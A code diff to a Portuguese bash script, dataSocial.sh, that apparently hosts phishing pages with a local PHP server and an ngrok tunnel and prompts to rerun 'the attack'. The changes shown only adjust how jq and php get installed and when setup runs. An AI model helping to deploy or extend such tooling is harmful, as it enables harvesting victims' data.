@@ -107,7 +107,7 @@ functionGroup() {
 }
 
 listenLocalhost() {
-    installReqIfNotExists
+    #installReqIfNotExists
     php -S ${host}:${port} -t ./www > /dev/null 2>&1 &
     sleep 3
 }
@@ -131,7 +131,6 @@ copyFiles() {
 tunnel() {
 
     if [ "$tunnel" == "ngrok" ] ; then
-	#installReqIfNotExists
         verifyProot
         ngrok http $port --log=stdout > /dev/null 2>&1 &
         sleep 3
@@ -277,21 +276,32 @@ installReqIfNotExists() {
     fi
 
     if [ ! -f ${dir}/jq ] ; then
-	while [ ! -f ${dir}/jq ] ; do
-	    printf "\r\e[33;1m[*] Instalando Jq...\e[0m"
-	    apt install jq -y > /dev/null 2>&1
- 	done
-	printf "\r\e[33;1m[+] Instalando Jq...\e[32;1mOK\e[0m\n"
+	if [ -d $PREFIX/bin ] ; then
+	    while [ ! -f ${dir}/jq ] ; do
+	        printf "\r\e[33;1m[*] Instalando Jq...\e[0m"
+   	        apt install jq -y > /dev/null 2>&1
+ 	    done
+	    printf "\r\e[33;1m[+] Instalando Jq...\e[32;1mOK\e[0m\n"
+	elif [ -d /usr/bin ] ; then
+	    echo -e "\e[33;1m[+] Instalando Jq...\e[32;1mOK\e[0m\n"
+	    apt-get update && apt-get install jq -yq
+	fi
     fi
 
     if [ ! -f ${dir}/php ] ; then
-	while [ ! -f ${dir}/php ] ; do
-	    printf "\r\e[33;1m[*] Instalando Php...\e[0m"
-	    apt install php -y > /dev/null 2>&1
-	done
-	printf "\r\e[33;1m[+] Instalando Php...\e[32;1mOK\e[0m\n"
+	if [ -d $dir ] ; then
+	    while [ ! -f ${dir}/php* ] ; do
+	        printf "\r\e[33;1m[*] Instalando Php...\e[0m"
+	        apt install php -y > /dev/null 2>&1
+	    done
+	    printf "\r\e[33;1m[+] Instalando Php...\e[32;1mOK\e[0m\n"
+	elif [ -d /usr/bin ] ; then
+	    echo -e "\e[33;1m[*] Instalando Php...\e[0m"
+	    apt-get update && apt-get install php -yq
+	fi
     fi
 }
+
 
 rerun() {
     echo -e "\e[32m[?] Realizar novamente este ataque? [y/n] : \e[0m" ; read
@@ -301,7 +311,7 @@ rerun() {
 
     elif [ -n "$REPLY" -a "$REPLY" == "y" -o "$REPLY" == "Y" ] ; then
 	clear
-	interrupt && ./dataSocial.sh $args
+	interrupt > /dev/null && ./dataSocial.sh $args
 
     elif [ -n "$REPLY" -a "$REPLY" == "n" -o "$REPLY" == "N" ] ; then
 	interruptTwo
@@ -316,6 +326,9 @@ if [ -z "$1" ] ; then
     banner
     echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mtente \e[33;1m-h\e[31;1m, \e[33;1m--help \e[31;1mpara ajuda\e[0m"
     exit 1
+
+elif [ ${#@} -eq 3 -o ${#} -eq 5 ] ; then
+    installReqIfNotExists
 
 elif [ -n "$1" ] ; then
 
